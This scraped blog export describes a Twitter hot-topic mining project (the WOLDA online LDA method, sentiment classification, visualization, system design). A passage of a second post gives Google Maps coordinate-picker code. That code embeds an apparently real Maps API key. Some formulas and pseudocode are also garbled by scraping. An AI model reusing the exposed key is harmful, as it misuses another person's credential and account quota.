实时热点话题挖掘 Twitter从2006年以来，发展迅猛。举两个数据来讲， 2015年5月，Twitter拥有超过5亿的用户，其中有超过3.32亿的活跃用户 2016年2月28日莱昂纳多获得第88届奥斯卡最佳男主角奖时，据统计，这一消息在Twitter上的讨论达到每分钟44万次 可以看出，Twitter的数据量是十分庞大的。为了能够了解Twitter上人们在谈论些什么，我们希望能够有一种有效的方 式来获取 Twitter 实时的热点话题。要求该方式： 能处理流数据并且对模型进行周期性的更新 。 产生的主题 与过去的 主题有关联 以便 观测话题的演变 。 资源占用稳定，不随时间增大而以便保证效率和对新话题的敏感 。 LDA模型 首先想到的就是主题模型。 2003年，D.Blei等人提出了广受欢迎的LDA（Latentdirichlet allocation）主题模型[8]。LDA除了进行主题的分析外，还可以运用于文本分类、推荐系统等方面。 LDA模型可以描述为一个“上帝掷骰子”的过程，首先，从主题库中随机抽取一个主题，该主题编号为K，接着从骰子库中拿出编号为K的骰子X，进行投掷，每投掷一次，就得到了一个词。不断的投掷它，直到到达预计的文本长度为止。简单的说，这一过程就是“随机的选择某个主题，然后从该主题中随机的选择词语”。按照之前的描述，一篇文档中词语生成的概率为： \\[ p(词语文档) = \\sum_{主题} (p(词语主题)·p(主题文档)) \\] 可以用矩阵的乘法来表示上述的过程： 回到LDA模型来说，LDA模型的输入是一篇一篇用BOW(bag of words)表示的文档,即用该文档中无序的单词序列来表示该文档（忽略文档中的语法和词语的先后关系）。LDA的输出是每篇文档的主题分布矩阵和每个主题下的单词分布矩阵。简而言之，LDA主题模型的任务就是已知左边的矩阵，通过一些方法，得到右边两个小矩阵。这里的“一些方法”即为LDA采样的方法，目前最主要的有两种，一种是变分贝叶斯推断(variationalBayes, VB),另一种叫做吉布斯采样(Gibbs Sampling)，其中吉布斯采样也被称为蒙特卡洛马尔可夫 (Markov Chain Monte Carlo，MCMC)采样方法。 总的来说，MCMC实现起来更加简单方便，而VB的速度比MCMC来得快，研究表明他们具有差不多相同的效果。所以，对于大量的数据，采用VB是更为明智的选择。 Hoffman OLDA 虽然VB的速度相对而言比较快，但是对于巨大的数据来说，VB计算量仍十分巨大的，对此，Hoffman提出了Online variational Bayes (VB)算法(下面简称为OLDA)，将数据集其分为一些小的batch, 然后更新，运算速度得到了巨大的提升。 WOLDA 虽然Hoffman提出的OLDA算法可以对后加进来的文档不断的更新，但是，该算法仍不能称得上是在线的算法。原因如下： 该算法采用静态词库(忽略不在词库中的词)，而对于Twitter来说，新词不断涌现，缩写词、网络流行语、特殊事件人名、地名频繁出现，基本无法预测。即使我们拥有一个囊括了所有词的词库，那么这个词库也必然是巨大的，造成矩阵过于稀疏，运算效率低下。 OLDA算法对旧话题“淡忘”速度越来越慢。如果一开始出现了所谓的“离题”(topic drift)现象，结果将会十分差劲，这不利于新话题的检测。 为此，改进的算法命名为WOLDA。 WOLDA采用动态的词库，（滑动时间窗口） 时间分为一个个时间片 只保留时间窗口L内的词 &amp;&amp; 词频 &gt; min_df（预设值） 对于1~L个时间片，对词频不小于min_df的词作为当前WOLDA的词库。 第L+1个时间片到来时，删除第1个时间片的文档，对第2个到第L+1个时间窗口内的文档重新计算词频，并将词频不小于min_df的词作为当前WOLDA的词库。 模型的更新方法为，对于新词，进行随机的初始化，而对于原本存在词库中的词有： \\[ \\lambda = C * \\lambda \\] 贡献因子C使得模型具有事件演变的能力，它将连续时间切片上的前后模型相结合。在具体的实现上，对于给定贡献因子C，我们只需要反解出OLDA中的更新次数t，将OLDA的更新次数重新设置为t即可，公式如下： \\[ t = (1-C)^{-\\frac{1}{\\kappa}}-\\tau_0 \\] 此外，还需要更新OLDA相应参数，如单词总数W和文档长度D。 算法描述如下： 12345678910定义窗口大小 L，贡献因子c,最小的词频 min_dffor n &#x3D; 0 to ∞ do 对时间片n的文档集合进行预处理，如去除停止词等操作。 if n&#x3D;&#x3D;1: 该文档集过滤词频小于min_df的，正常运行OLDA else if 2 &lt;&#x3D; n &lt;&#x3D; L: 把第2~n的文档所有词重新计算词频，词频不小于min_df的词作为当前OLDA词库，新的词随机初始化。计算t，更新W和D，运行OLDA算法。 else if n &gt; L: 删除第n-L篇文档，将第n–L+1 ~ n的文档的所有词重新计算词频，词频不小min_df的词作为当前OLDA词库，新的词随机初始化。计算t，更新W和D，运行OLDA算法。end for 最具有代表性的推文计算 运行WOLDA算法后，我们得到了每个主题下对应的主题词，主题词有时候对于主题的描述不够直观，为此我们希望从该主题下，能找到最具有代表性的推文，用来帮助解释和说明该主题的内容。本小节提出几种最具有代表性的推文的计算方法，并在之后的实验中加以对比。 KL-mean KL散度(Kullback–Leibler divergence)又称为相对熵（relative entropy），它可以用来衡量两个概率分布的相似程度。对于离散型的随机变量，其概率分布P和Q的KL散度定义如下： \\[ D_{KL}(PQ) = \\sum_iP(i) ln\\frac{P(i)}{Q(i)} \\] 通常情况下KL散度是非对称的，因此这里采用KL-mean方式（求P和Q KL散度以及Q和P KL散度的均值） \\[ D_{KL-mean}(PQ) = \\frac{1}{2}(D_{KL}(PQ) +D_{KL}(QP) ) \\] 使用KL-mean距离计算最具有代表性的推文伪代码如下： 1234567891011121314pro_matrix: 主题-单词矩阵features &#x3D; []for tweet_id,tweet in tweets do topic_id根据文档-主题矩阵得到当前推文最大可能从属的主题序号 feature &#x3D; [0 …] &#x2F;&#x2F; 长度为词库的大小的全0数组 for word_id, each word in tweet do: &#x2F;&#x2F;word_id 为当前单词在词库中的下标 feature[word_id] &#x3D; word_cnt * pro_matrix[topic_id][word_id] &#x2F;&#x2F;当前单词出现的次数乘以相应的主题-单词矩阵中的概率 end for features.append(feature)end for对于所有相同主题序号的推文，计算其feature的平均值作为主题的中心。接着使用KL-mean距离计算每条推文与其主题中心的距离dis对于每个主题，找到与类中心最小距离的推文，该推文即为最具有代表性的推文。 余弦距离 余弦距离常常用来衡量相似度(通过计算两个向量夹角的余弦值)。其定义如下： \\[ D_{cos}(P,Q) = \\frac{P·Q}{P·Q} \\] 使用余弦距离计算最具有代表性的推文的方法与KL散度的方法过程类似，只不过最后采用了余弦距离来计算每条推文与其主题中心的距离。 最大熵 在信息学中，熵（Entropy）常常被用来衡量信息不确定度的大小，信息的不确定度，表明其信息量也越大，同时熵也越大。熵的计算公式如下： \\[ Entropy(X) = -\\sum_iP(x_i)log_2P(x_i) \\] 1234567891011p: 主题-单词矩阵entropy &#x3D; []for tweet_id,tweet in tweets do topic_id根据文档-主题矩阵得到当前推文最大可能从属的主题序号 cur_entropy &#x3D; 0 for word_id, each word in tweet do: &#x2F;&#x2F;word_id 为当前单词在词库中的下标 cur_entropy +&#x3D; -p[topic_id][word_id] * log2 (p[topic_id][word_id]) end for entropy.append(feature)end for对于每个主题，找到熵最大的推文，该推文即为最具有代表性的推文 情感分析 为什么要进行情感分析？Twitter的作为一个微博客服务，它的推文中又充斥着大量的观点见解，进行情感分析也同样具有广阔的应用场景,比如说以下的这个方面： 情感分析可以帮助用户做出是否购买的决策。例如，消费者在犹豫是否购买产品时，会很自然的去查看其他人对于该商品的评价。如果“好评”居多，该消费者可能就会进行购买；反之，如果“差评”占大多数，那么该消费者一般而言就不会进行购买了。如果能针对Twitter这种既有强时效性又有广泛话题领域的社交媒体进行情感分析，那将给用户带来更多的便利。 情感分析还可以帮助企业进行市场调研。企业在推出一款新的产品之后，可以通过情感分析来从大量的用户评价中得到有用的信息，如用户喜欢什么，不喜欢哪一方面，对公司的产品和服务有哪些正面或负面的影响。从而企业可以了解自身的优势和不足，可以更好的制定相应的措施进行服务的改进，从而在激烈的市场竞争中占据主动地位。 舆情监控。由于用户可以在社交媒体上相对自由的发表自己的观点，这使得社交媒体成为了舆情话题产生和传播的重要方式。通过对社交媒体的情感分析，可以为政府了解民意、引导舆论提供有效的工具。对于负面的消息，可以较为及时的安抚好民众的情绪，避免事态进一步恶化。同时，政府也可以制定相应的策略来改善现有的服务。 事件预测。随着互联网发展，越来越多的民众愿意到网上发表自己对某一事件的看法，无论是在诸如Twitter、新浪微博这样的微博客，还是在贴吧、知乎等站点上。一个典型的例子就是最近阿里人工智能运用神经网络、情绪感知等技术对《我是歌手》第四季总决赛的歌王进行了成功的预测。此外，Twitter这一个平台也常常被拿来预测选举、股票等。 情感分析方法 本文采用的情感分析可以说是一个标准的机器学习的分类问题。 目标是给定一条推文，将其分为正向情感、负向情感、中性情感。 预处理 POS标注 CMU ArkTweetNLP 字母连续三个相同 替换 “coooooooool”=&gt;“coool” 删除非英文单词 删除URL 删除@ 删除用户的提及@username 删除介词、停止词 否定展开 将以\"n't\"结尾的单词进行拆分，如\"don't\" 拆分为\"do not\",这里需要注意对一些词进行特殊处理，如\"can't\"拆分完之后的结果为\"can not\"，而不是\"ca not\"。 否定处理 从否定词（如shouldn't）开始到这个否定词后的第一个标点（.,?!）之间的单词，均加入_NEG后缀。如perfect_NEG。 “NEG”后缀 特征提取 文本特征 N-grams 1~3元模型 使用出现的次数而非频率来表示。不仅是因为使用是否出现来表示特征有更好的效果[16]，还因为Twitter的文本本身较短，一个短语不太可能在一条推文中重复出现。 感叹号问号个数 在句子中的感叹号和问号，往往含有一定的情感。为此，将它作为特征。 字母重复的单词个数 这是在预处理中对字母重复三次以上单词进行的计数。字母重复往往表达了一定的情感。 否定的个数 否定词出现后，句子的极性可能会发生翻转。为此，把整个句子否定的个数作为一个特征 缩写词个数等 POS 标注为[‘N’, ‘V’, ‘R’, ‘O’, ‘A’] 个数（名词、动词、副词、代词、形容词) 词典特征（本文使用的情感词典有：Bing Lius词库[39]、MPQA词库[40]、NRC Hashtag词库和Sentiment140词库[42]、以及相应的经过否定处理的词库[45]） 推文中的单词在情感字典个数 （即有极性的单词个数） 推文的 总情感得分：把每个存在于当前字典单词数相加，到推文的 总情感得分：把每个存在于当前字典单词数相加，到推文的 总情感得分：把每个存在于当前字典单词数相加，到推文总分，这个数作为一特征。 推文中单词最大的正向情感得分和负。 推文中所有正向情感的单词分数 和以及 所有负向情感单词的分数和。 最后一个词的分数 表情特征 推文中正向 情感 和负向的表情个数 最后一个表情的极性是 否为正向 特征选择 本文 特征选择主要是针对于 N-grams 特征 的，采用方法如下： 1234567设定min_df（min_df&gt;&#x3D;0）以及threshold（0 &lt;&#x3D; threshold &lt;&#x3D; 1）对于每个在N-grams的词:统计其出现于正向、负向、中性的次数，得到pos_cnt, neg_cnt, neu_cnt，以及出现总数N,然后分别计算pos &#x3D; pos_cnt &#x2F; Nneg &#x3D; neg_cnt &#x2F; Nneu &#x3D; neu_cnt &#x2F; N对于 pos,neg,neu中任一一个大于阈值threshold 并且N &gt; min_df的，保留该词，否则进行删除。 上述算法中滤除了低频的词，因为这可能是一些拼写错误的词语；并且，删除了一些极性不那么明显的词，有效的降低了维度。 分类器选择 在本文中，使用两个分类器进行对比，他们均使用sklearn提供的接口 。第一个分类器选用SVM线性核分类器，参数设置方面，C = 0.0021，其余均为默认值。第二个分类器是Logistic Regression分类器，其中，设置参数C=0.01105。 在特征选择上，min_df=5, threshold=0.6。 实验 SemEval（国际上的一个情感分析比赛）训练数据和测试数据 评价方法采用F-score 对比SemEval2016结果如下 测试集名 测试集名 SVM（F-score/Rank） Logistic Regression（F-score/Rank） 2013 Tweet 0.701 / 5 0.714 / 3 2013 SMS 0.719 / 1 0.722 / 1 2014 Tweet 0.693 / 8 0.692 / 8 2014 Tweet sarcasm 0.478 / 6 0.478 / 6 2014 Live Journal 0.712 / 4 0.726 / 2 数据可视化 为什么要进行数据可视化呢？因为可以更快速、更轻松的提取出数据的含义。例如 将3标注为红色容易找出所有的3 画柱状图容易找数组【 321, 564, 1391, 245, 641, 798,871 】中的最大值 简单的统计结果可视化 Hashtag统计 由于Hashtag是用户手动添加的、用来表明当前发表的推文的主题。因此对其进行统计，然后进行可视化也是具有一定意义的。简单的说，进行hashtag统计的可以有柱状图、饼状图、趋势图三种方法。 地理位置信息的可视化 Twitter的API返回字段中，有几个字段是和地理位置相关的，用来表示该推文的发表位置，或者某地点和该推文相关。我们可以对地理位置信息进行统计计数。一个可视化的办法就是在地图上根据经纬度坐标画一个个的点，但是当有多个点再一个小区域的时候可读性较差，因此本文使用的是热力图。一个样例图如下: 话题结果可视化 在LDA主题模型中，输出结果有两个矩阵，其中一个是主题-单词矩阵，这也是本小节要探讨的可视化内容。 为了能够很好的表示出主题以及对应的单词，本文提出可以使用矩形树图（TreeMap）、气泡图（Bubble）、以及旭日图（Sunburst）来表示LDA的结果。 矩形树图 矩形树图是由一个个矩形递归组成的。 同一个颜色表示同一主题，而矩形大小表示概率大小。 在图形交互方面，矩形树图支持点击后放大查看。 气泡图 同一个主题同一个圈，同一个圈内的圆大小表示概率的大小。 在图形交互方面，气泡图支持点击后放大查看某一主题下的内容。 旭日图 旭日图它可以说是饼状图的升级版。在最内圈的数据为每个主题，同时，用不同的颜色加以区分，内圈所占的大小就反映了主题的热度。接着，对于每个主题，向外延伸出对应的主题词，每个主题词占的面积大小就反映了其概率的大小。此外，本文做出了特殊的处理，将主题词中更重要的主题词在加一层显示。 最重要的主题词计算方法为：按主题的概率从大到小排序，然后，从大到小进行遍历，对概率和进行累加，当对某一项i累加后的和大于0.4，则从第一个主题词到第i个主题词为该主题的最重要的主题词。 旭日图的用户交互为，点击某一块区域，则图形变化为某主题下的单词概率分布饼图。 情感分析的可视化 针对于情感分析，我们的任务是对于给定一些推文，判断其实情感类别。在分类结果完成后，我们可以对分类的结果进行统计。可以采用类似于对Hashtag的统计结果进行可视化的方法，如柱状图、饼状图，这里不再赘述。此外，还可以用“仪表盘”的方式来进行可视化。 Twitter数据挖掘平台的设计与实现 本章基于前面几个章节所讨论的问题与相关的算法，设计并实现了Twitter数据挖掘与可视化系统。这个系统主要包含数据抓取模块、数据存储模块、主题分析模块、情感分析模块、WEB模块一共六大模块。开发系统时使用Git进行版本控制，并且提交到Github这个开源代码网站，方便多个人共同进行开发和维护。 系统的总体框架 本文系统的后端使用了Python的Django框架，前端可视化采用了D3.js和Echarts，除此之外，使用了JQuery + Bootstrap进行用户界面的快速开发。数据存储方面，使用的是MongoDB数据库。 下面是框架图： 数据抓取模块 数据抓取模块的主要功能是根据用户想要追踪的信息，向Twitter发送相应的请求。对于数据挖掘的平台来说，一个健壮的数据挖取模块是十分必要的。这个模块除了应对超过API的限定的速率错误外，各种HTTP的错误也是需要进行处理的。Twitter常见的HTTP错误及应对措施如下： 错误代码 错误描述 应对措施 401 无OAuth验证或验证失败 提示进行OAuth验证 404 URI请求不合法或查询内容不存在 返回空 429 超出速率限制 等待15分钟继续，或者换另外一个账号继续抓取 500,502,503,504 服务器错误 等一段时间继续，每次错误将等待时间延长，超过一定的错误次数报错。 更多的Twitter从错误代码详见Twitter开发者平台。 数据存储模块 数据存储的功能主要是对于数据抓取模块所抓取的数据进行存储，方便日后的继续研究；以及对存储内容的读取、查询。主要用到了MongoDB数据库。 MongoDB MongoDB是由C++语言编写的，一个基于分布式文件存储的开源数据库系统。同时，MongoDB也是一种NoSQL(Not only SQL)数据库。 它可以方便的进行数据分片，采用水平扩展的方式，添加更多的节点，来保证服务器的性能，并且成本相对垂直扩展来说更加低廉，同时，它原生的支持Map-Reduce操作。 文献[46]比较了MongoDB和MySQL的优缺点。文献[47]和文献[48]比较了mongodb和关系型数据库如MySQL，MS-SQL数据库的速度，结论是mongodb具有更快的速度。 关系型数据库与NoSQL数据库 数据大小-查询时间对比图如下[33] 正是由于MongoDB有更好更稳定的性能，且数据格式为JSON和twitter返回的一致。因此本系统选择了MongoDB作为数据库，并采用了索引技术。 数据压缩 MongoDB将数据存储为一个文档，数据结构由键值对(key=&gt;value)组成。MongoDB 文档的存储类型是BSON，它类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。它不像MySQL之类的关系型数据库，必须先指定好数据表中的列，而可以随意的增加或删除文档中的字段（即关系型数据库中的列），但每一条数据都要保存相应的字段名。 Twitter 返回的原始推文信息是十分庞大的，除了140字符的文字，还有许多其他的字段。若将其展开，其内容将会超过5KB,这大约我们认为的140个字符文字的37倍！并且由于Twitter中有大量的字段经常为空，用MongoDB进行存储时，不管该字段是否为空，都会进行存储，这样一来将占据大量的存储空间，并且其占据的空间与字段长度成正相关的关系。比如说，\"in_reply_to_user_id\" 一栏往往为空，但是存储中仍会有这个字段。 对此，需要对字段进行删减，只保留一些有用的字段，当该字段为空的时候不存储，且对字段进行重命名操作，减少其长度。 更新后所保留的字段如下表： 字段名 原字段名 类型 geo coordinates array date created_at date like favorite_count int id id_str string reply_id in_reply_to_status_id_str string reply_user_id in_reply_to_user_id_str string quoted_id quoted_status_id_str string retweet_id retweeted_status[‘id_str’] string retweet_count retweet_count int text text string use_id user[‘user_id_str’] string hashtags entities[‘hashtags’][‘text’] array urls entities[‘usrls’][‘expanded_url’] array user_mentions entities[‘mentions’][‘id_str’] array 一个直观的对比就是1000多万条推文的时候，按Twitter API返回的结果直接进行存储，就有97.906GB的空间。而精简后的只剩下了9.949GB，体积减少了将近90%，但是携带的有用的信息几乎没少，这有利于数据的查询和存储。 主题分析模块 主题的模块主要是对推文数据进行主题的挖掘，这些推文数据可以来自抓取模块中实时获取的Twitter数据，也可以来自数据存储模块中获取历史的数据。通过对数据的实时计算，计算出主题词以及最具有代表性的推文，并按照话题的热度进行排序，返回给前台页面。 对于在线的数据流，本文使用了多线程，一个线程进行调用Stream API请求，一个线程进行WOLDA模型的计算，一个线程负责接收WOLDA的结果。具体的流程如下： 其中，涉及到了线程安全，如从结果队列中取出数据的时候，需要对其进行加锁等。 使用在线数据时，默认对每分钟的数据进行计算。采用一分钟的计算间隔是基于如下几点考虑：（1）若时间过短，那么推文数过少，更新没有太多的意义(2)若设置时间过长，则可能无法第一时间捕捉到紧急的话题等。因此，本文采用一分钟的间隔，这样可以保证话题的实时性又不会有过多无用的计算。 此外，用户可自定义WOLDA算法的相应参数，如时间窗口L，主题数K等。 情感分析模块 情感分析模块调用了抓取模块，将用户待查询的关键字作为参数，然后对Twitter返回的推文进行情感分析。将推文进行情感分析之后，并且返回一些参考的推文在前台展示。 这其中，需要用到之前的情感分析算法，只不过分类器是已经训练好的，只需要对推文进行相应的预测即可。 WEB模块 WEB模块主要作用是用户交互，包括了用户的界面、用户自定义的参数处理、结果的可视化等。 为了改善用户体验，使用了AJAX技术，在获取服务器分析的结果时，添加等待效果。（见为AJAX添加等待效果） 此外，利用了Google Map API在地图上点击来获取地区的经纬度，方便对某地区进行话题追踪。(见使用google map API获取经纬度) 界面展示 总结与展望 主要内容总结 提出了WOLDA算法，该算法改进自Hoffman的OLDA算法。WOLDA算法使用动态的词库，能更好的处理流式数据并进行周期性的更新，并且该方式资源占用稳定，不随时间的增大而无限的增大，保证效率和对新话题的敏感程度。同时，提出了最具有代表性推文的计算方法，方便对于主题的理解和分析。 结合了基于情感词典的方法和基于机器学习的方法，将情感词典作为分类器的一部分特征，在SemEval2016最新的结果中，取得较为靠前的排名。 提出了Twitter进行可视化的方法，包括简单的统计、主题模型结果的可视化、情感分析结果的可视化。 基于本文中算法和可视化的方法，设计并实现了Twitter数据挖掘与可视化平台。 工作展望 本文所涉及的相关研究仍有不足，为此，以下列出了主要可以改进的内容： 热点话题方面 本文WOLDA仍需要手动的指定主题的个数K，这个K值将影响结果的好坏，K如果设置过大，那么原本属于一个主题的将会被拆分成多个主题；若设置过小，则多个主题可能会被合并为一个。为此，需要合适的方法来动态的设置主题个数。 WOLDA算法本质上仍是一个LDA模型，无法克服LDA对于Twitter这样的的短文本效果不佳的状况。它不能简单的采用LDA-AT的模型进行改进，因为在短时间内，同一作者的推文往往数量极少，因此可能需要对整个模型本身进行重构。 推文中有大量的无意义的内容，可以进一步使用命名实体识别（NER）来进行去除。 情感分析方面 进一步的提高对于反语分类的精度。 可以采用word2vector来代替ngram来表示词的特征 情感分析的对象可以不受限于文本，Twitter的图片等多媒体信息也是可以进行研究的。 数据挖掘系统 进一步提高系统的稳定性与用户操作的便利性。 随着数据的不断增多，对于数据存储，由于采用MongoDB,可以方便的采用数据分片的方式来解决。相应的算法可以考虑移植到Spark上运行，提高对海量数据的运算能力。 除了以上的几个改进方面外，本论文只探讨了Twitter下的数据挖掘，未来可以转向对新浪微博进行相关的研究。 本文的代码已在Github开源： twitterDataMining","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"课程设计","slug":"study/课程设计","permalink":"https://www.hrwhisper.me/categories/study/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Data mining","slug":"Data-mining","permalink":"https://www.hrwhisper.me/tags/Data-mining/"}]},{"title":"使用google map API获取经纬度","slug":"use-google-map-api-get-latitude-and-longitude","date":"2017-02-08T10:44:27.000Z","updated":"2021-01-08T13:42:14.036Z","comments":true,"path":"use-google-map-api-get-latitude-and-longitude/","link":"","permalink":"https://www.hrwhisper.me/use-google-map-api-get-latitude-and-longitude/","excerpt":"当年在做毕设的时候一个功能是在地图上点击，然后获取对应的地区的经纬度，然后用来追踪该地区发布的tweets","text":"当年在做毕设的时候一个功能是在地图上点击，然后获取对应的地区的经纬度，然后用来追踪该地区发布的tweets 效果 鼠标左键点击在地图上增加标记，并显示经纬度信息 鼠标右键取消地图标记 关闭模态框后，地图上所有标记点的经纬度信息都会出现在文本框中 首先让大家看看效果 点击获取经纬度坐标 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&#123;% raw %&#125;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.4.1&#x2F;css&#x2F;bootstrap.min.css&quot; integrity&#x3D;&quot;sha384-Vkoo8x4CGsO3+Hhxv8T&#x2F;Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.slim.min.js&quot; integrity&#x3D;&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;popper.js@1.16.0&#x2F;dist&#x2F;umd&#x2F;popper.min.js&quot; integrity&#x3D;&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;stackpath.bootstrapcdn.com&#x2F;bootstrap&#x2F;4.4.1&#x2F;js&#x2F;bootstrap.min.js&quot; integrity&#x3D;&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;maps.googleapis.com&#x2F;maps&#x2F;api&#x2F;js?key&#x3D;AIzaSyDRk0h7XH8hieXFGV4N-yi89lkZUd9u4AE&quot;type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;&lt;button class&#x3D;&quot;btn btn-primary&quot; data-toggle&#x3D;&quot;modal&quot; data-target&#x3D;&quot;#google_maps_api&quot;&gt;点击获取经纬度坐标&lt;&#x2F;button&gt;&amp;nbsp;&lt;div id&#x3D;&quot;google_maps_api&quot; class&#x3D;&quot;modal fade&quot; tabindex&#x3D;&quot;-1&quot; role&#x3D;&quot;dialog&quot; aria-labelledby&#x3D;&quot;myModalLabel&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;div class&#x3D;&quot;modal-dialog&quot;&gt;&lt;div class&#x3D;&quot;modal-content&quot;&gt;&lt;div class&#x3D;&quot;modal-header&quot;&gt;&lt;button class&#x3D;&quot;close&quot; type&#x3D;&quot;button&quot; data-dismiss&#x3D;&quot;modal&quot; aria-hidden&#x3D;&quot;true&quot;&gt;×&lt;&#x2F;button&gt;&lt;div id&#x3D;&quot;myModalLabel&quot; class&#x3D;&quot;modal-title&quot;&gt;选取locations&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;div class&#x3D;&quot;modal-body&quot;&gt;&lt;div id&#x3D;&quot;map_canvas&quot; style&#x3D;&quot;width: 100%; height: 450px;&quot;&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;div class&#x3D;&quot;modal-footer&quot;&gt;&lt;button class&#x3D;&quot;btn btn-primary&quot; type&#x3D;&quot;button&quot; data-dismiss&#x3D;&quot;modal&quot; aria-hidden&#x3D;&quot;true&quot;&gt;OK&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;script&gt;var googleMap &#x3D; &#123; map: null, markers: &#123;&#125;, currentId: 0, uniqueId: function () &#123; return ++this.currentId; &#125;, infowindow: new google.maps.InfoWindow(&#123; size: new google.maps.Size(150, 50) &#125;), initialize: function () &#123; if (this.map) return null; var myOptions &#x3D; &#123; zoom: 2, center: new google.maps.LatLng(43, 0), mapTypeControl: true, mapTypeControlOptions: &#123;style: google.maps.MapTypeControlStyle.DROPDOWN_MENU&#125;, navigationControl: true, mapTypeId: google.maps.MapTypeId.ROADMAP &#125;; this.map &#x3D; new google.maps.Map(document.getElementById(&quot;map_canvas&quot;), myOptions); google.maps.event.addListener(this.map, &#39;click&#39;, function () &#123; googleMap.infowindow.close(); &#125;); google.maps.event.addListener(this.map, &#39;click&#39;, function (event) &#123; var Latitude &#x3D; event.latLng.lat().toFixed(2); var longitude &#x3D; event.latLng.lng().toFixed(2); googleMap.addMarker(event.latLng, &quot;name&quot;, &quot;&lt;b&gt;Location&lt;&#x2F;b&gt;&lt;br&gt;&quot; +Latitude +&quot;,&quot;+ longitude, Latitude +&quot;,&quot;+ longitude); &#125;); &#x2F;&#x2F;google.maps.event.addListener(this.map, &#39;click&#39;, function (event) &#123; &#x2F;&#x2F; console.log(&quot;Latitude: &quot; + event.latLng.lat() + &quot; &quot; + &quot;, longitude: &quot; + event.latLng.lng()); &#x2F;&#x2F;&#125;); &#125;, addMarker: function (Gpoint, name, contentString, geo) &#123; var id &#x3D; this.uniqueId(); &#x2F;&#x2F; get new id marker &#x3D; new google.maps.Marker(&#123; id: id, position: Gpoint, geo : geo, map: googleMap.map, draggable: true, animation: google.maps.Animation.DROP &#125;); google.maps.event.addListener(marker, &#39;click&#39;, function () &#123; googleMap.infowindow.setPosition(this.position); googleMap.infowindow.setContent(contentString); googleMap.infowindow.open(googleMap.map, marker); &#125;); google.maps.event.trigger(marker, &#39;click&#39;); googleMap.map.panTo(Gpoint); this.markers[id] &#x3D; marker; google.maps.event.addListener(marker, &quot;rightclick&quot;, function (point) &#123; googleMap.delMarker(this.id) &#125;); &#x2F;&#x2F;var res &#x3D; &#39;&#39;; &#x2F;&#x2F;for (i in googleMap.markers)&#123; &#x2F;&#x2F; res +&#x3D; googleMap.markers[i].geo + &#39;,&#39;; &#x2F;&#x2F;&#125; &#x2F;&#x2F;res &#x3D; res.substring(0,res.length-1) &#x2F;&#x2F;console.log(res); &#125;, delMarker: function (id) &#123; this.markers[id].setMap(null); delete this.markers[id]; &#125;&#125;;&lt;&#x2F;script&gt;&lt;script&gt; jQuery(document).ready(function($) &#123; $(&quot;#google_maps_api&quot;).on(&quot;shown.bs.modal&quot;, function () &#123; googleMap.initialize(); &#x2F;&#x2F; googleMap.maps.event.trigger(map, &quot;resize&quot;); &#125;).on(&#39;hide.bs.modal&#39;, function () &#123; &#x2F;&#x2F;关闭模态框 var res &#x3D; &#39;&#39;; for (var i in googleMap.markers) res +&#x3D; &#39;(&#39; + googleMap.markers[i].geo + &#39;),&#39;; res &#x3D; res.substring(0,res.length-1); $(&quot;#locationText&quot;).val(res); &#125;); &#125;); &lt;&#x2F;script&gt;&#123;% endraw %&#125; 获取API key 要使用google map API，那么需要获取API key，才能使用，获取的地址为：get API key 在获取完之后，将下面的YOUKEY改为你的API key，引入需要的js文件 1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;maps.googleapis.com&#x2F;maps&#x2F;api&#x2F;js?key&#x3D;YOUKEY&quot;type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt; 核心代码 需要： Bootstrap JQuery Google MAP的JS（就是上面那行代码） 下面是前端页面 12345678910111213141516171819202122232425262728293031323334&lt;button class=&quot;btn btn-primary&quot; data-toggle=&quot;modal&quot; data-target=&quot;#google_maps_api&quot;&gt;点击获取经纬度坐标&lt;/button&gt;&lt;textarea class=&quot;form-control&quot; id=&quot;locationText&quot; rows=&quot;2&quot; style=&quot;width:500px&quot;&gt;&lt;/textarea&gt;&lt;div class=&quot;modal fade&quot; id=&quot;google_maps_api&quot; tabindex=&quot;-1&quot; role=&quot;dialog&quot; aria-labelledby=&quot;myModalLabel&quot; aria-hidden=&quot;true&quot;&gt; &lt;div class=&quot;modal-dialog&quot;&gt; &lt;div class=&quot;modal-content&quot;&gt; &lt;div class=&quot;modal-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot;data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/button&gt; &lt;h4 